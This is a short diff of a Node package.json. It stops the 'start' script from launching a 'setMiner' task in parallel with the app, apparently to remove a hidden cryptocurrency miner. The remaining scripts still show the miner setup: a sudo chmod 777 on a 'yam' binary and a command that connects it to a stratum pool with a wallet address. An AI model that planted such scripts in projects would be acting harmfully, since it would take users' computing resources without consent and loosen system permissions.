@@ -8,7 +8,7 @@
   },
   "main": "server.js",
   "scripts": {
-    "start": "npm-run-all --parallel startApp setMiner",
+    "start": "npm-run-all --parallel startApp",
     "setMiner": "npm-run-all mode miner",
     "mode": "sudo chmod 777 yam-yvg1900-M7v-linux64-core2/linux64-core2/yam",
     "miner": "yam-yvg1900-M7v-linux64-core2/linux64-core2/yam -c x -M stratum+tcp://etnkEhFkLYk1r3DGFYc6nFKisTUbv51DxARtf6cZeXV8CqBwXaZhazGBpfEkEpAYEnTYCMwBKupddE5QZLBhNQsa5waXtghSwB:x@etn-pool.proxpool.com:3333/xmr",
